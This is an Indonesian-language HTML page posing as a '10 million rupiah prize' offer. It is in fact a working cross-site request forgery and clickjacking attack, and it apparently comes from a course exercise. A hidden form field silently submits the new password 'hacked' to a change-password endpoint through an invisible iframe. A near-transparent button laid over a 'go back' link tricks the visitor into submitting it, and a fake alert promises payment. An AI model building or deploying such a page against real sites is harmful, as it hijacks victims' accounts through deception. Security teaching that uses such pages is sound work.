<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hadiah 10 Juta!!!</title>
</head>
<body>
    <h1>Hadiah 10 Juta!!!</h1>
    <form action="/pertemuan9/changepasswordcontroller.php" method="post" target="hidden-frame">
        <input type="hidden" name="new-password" id="new-password" value="hacked" />
        <input type="text" name="no-rekening" id="no-rekening" placeholder="Masukkan nomor rekening Anda">
        <br><br>
        <button onclick="alert('Harap menunggu 24 jam agar uang sampai ke rekening Anda')">
            Dapatkan 10 Juta
        </button>
        <br><br>
        <div style="position:relative">
            <a href="#">Kembali ke halaman sebelumnya</a>
            <button style="position:absolute;left:0;opacity:0.01">Kembali ke halaman sebelumnyaaa</button>
        </div>
    </form>
    <iframe name="hidden-frame" style="display: none"></iframe>
</body>
</html>